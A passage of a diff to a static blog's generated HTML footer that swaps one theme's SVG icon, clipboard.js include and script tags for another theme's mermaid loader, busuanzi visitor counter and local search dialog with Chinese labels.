-      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
-      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
-      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
-    </svg>
-  </div>
-
-  
-  <!-- aplayer -->
-
-
-<!-- dplayer -->
-
-
-<!-- copy button  -->
-<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
-
-<!-- https://clipboardjs.com/ -->
-
-
-
-
-
-
-
-
-
-  
-
-
-  
-
-
-  
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-  
-  <!-- 尾部用户自定义相关内容 -->
-</body>
-</html>
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.14.0-b3"></script></div></div></body></html>
